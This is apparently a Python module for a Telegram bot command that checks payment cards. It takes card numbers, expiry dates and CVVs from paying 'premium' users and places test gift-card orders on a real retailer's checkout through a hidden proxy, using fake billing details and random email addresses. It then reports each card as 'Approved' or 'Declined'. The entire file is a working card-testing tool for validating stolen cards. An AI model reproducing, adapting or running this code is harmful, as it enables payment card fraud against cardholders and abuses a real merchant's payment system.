import requests as r
import string, random, re
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode

session = r.Session()
API = "https://www.usakilts.com/checkout/cart/"

proxy = {
    'http': 'http://154.95.36.199:6893',
}

@Client.on_message(filters.command(["ue", "uepay"], ["/", ",", ".", ";"]))
async def uepay(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msg = await m.reply("checking...", quote=True)
    cc_check = await getLive(card, msg)    


def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)
        
def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12)  # Longitud aleatoria del nombre de usuario
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

async def getLive(card, msg):
    card = card.replace(":", "|").replace("/", "|").replace(" ", "|")
    card_details = card.split("|")
    card = card_details[0]
    if card[0] == '4':
        card_type = "VI"
    elif card[0] == '5':
        card_type = 'MC'
    
    elif card[0] == '3':
        card_type = "AE"
    else:
        pass
    month = card_details[1]
    year = card_details[2]
    cvv = card_details[3]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: Get the page and fillouw with data ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'www.usakilts.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,es;q=0.9',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    response = session.get('https://www.usakilts.com/accessories/gift-card/gift-card.html', headers=headers, proxies=proxy)
    
    await msg.edit_text("1", parse_mode=ParseMode.MARKDOWN)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Requests: ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'www.usakilts.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en,es;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.usakilts.com',
        'referer': 'https://www.usakilts.com/accessories/gift-card/gift-card.html',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'product': '23195',
        'aw_gc_custom_amount': '10',
        'aw_gc_sender_name': 'Leonel',
        'aw_gc_sender_email': email_generator(),
        'aw_gc_recipient_name': 'Leonel M.',
        'aw_gc_recipient_email': email_generator(),
        'aw_gc_message': 'Quack.Inc',
        'qty': '0',
        'isAjax': '1',
    }

    response = session.post(
        'https://www.usakilts.com/ajax/index/add/uenc/aHR0cHM6Ly93d3cudXNha2lsdHMuY29tL2FjY2Vzc29yaWVzL2dpZnQtY2FyZC9naWZ0LWNhcmQuaHRtbA,,/product/23195/form_key/Vi6uwam7RIODaFEG/',
        headers=headers,
        data=data,
        proxies=proxy
    )
    
    await msg.edit_text("2", parse_mode=ParseMode.MARKDOWN)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third Requests: ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'www.usakilts.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en,es;q=0.9',
        'referer': 'https://www.usakilts.com/accessories/gift-card/gift-card.html',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    response = session.get('https://www.usakilts.com/onestepcheckout/index/', headers=headers, proxies=proxy)
    
    await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourd Requests: ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'www.usakilts.com',
        'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
        'accept-language': 'en,es;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.usakilts.com',
        'referer': 'https://www.usakilts.com/onestepcheckout/index/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-prototype-version': '1.7',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'billing[firstname]': 'Leonel',
        'billing[lastname]': 'M.',
        'billing[email]': email_generator(),
        'billing[customer_password]': '',
        'billing[confirm_password]': '',
        'billing[street][]': [
            '389 Av park',
            '903 south',
        ],
        'billing[country_id]': 'US',
        'billing[city]': 'New york',
        'billing[region_id]': '43',
        'billing[region]': '',
        'billing[postcode]': '10080',
        'billing[telephone]': '725798301',
        'billing[fax]': '',
        'billing[company]': 'Quack.Inc',
        'billing[save_in_address_book]': '1',
        'billing[use_for_shipping]': '1',
        'shipping[firstname]': '',
        'shipping[lastname]': '',
        'shipping[street][]': [
            '',
            '',
        ],
        'shipping[country_id]': 'US',
        'shipping[city]': '',
        'shipping[region_id]': '',
        'shipping[region]': '',
        'shipping[postcode]': '',
        'shipping[telephone]': '',
        'shipping[fax]': '',
        'shipping[company]': '',
        'shipping[save_in_address_book]': '1',
        'comments': '',
        'payment[method]': 'usaepay',
        'payment[cc_owner]': 'Leonel M',
        'payment[cc_type]': card_type, #MC for mastercard, VI for visa, AE for american express
        'payment[cc_number]': card,
        'payment[cc_exp_month]': month,
        'payment[cc_exp_year]': year,
        'payment[cc_cid]': cvv,
        'coupon_code': '',
        'aw_giftcard_code': '',
        'is_subscribed': '1',
    }

    response = session.post('https://www.usakilts.com/onestepcheckout/ajax/placeOrder/', headers=headers, data=data, proxies=proxy)
    conver_proxy = re.sub(r'[^a-zA-Z0-9\s.:]+', '', str(proxy)).split(":")[2]
    hide_ip = conver_proxy.split('.')
    hide_ip[-3:] = ['x'] * 3
    show_ip= '.'.join(hide_ip)
    
    if "There was an error processing your order" in response.text:
        mssg = f"""<b>Card Declined</b> ❌
━━━━━━━━━━━
┌ <b>card:</b> <code>{card}:{month}:{year}:{cvv}</code>
├ <b>Response:</b> {response.text}
├ <b>Gateaway: UsaEPay</b>
└ <b>Proxy:</b> {show_ip}"""
    else:
         mssg = f"""<b>Card Approved</b> ✅
━━━━━━━━━━━
┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
├ <b>Gateaway: UsaEPay
└ <b>Proxy:</b> {show_ip}
"""
        
    await msg.edit_text(mssg, parse_mode=ParseMode.HTML)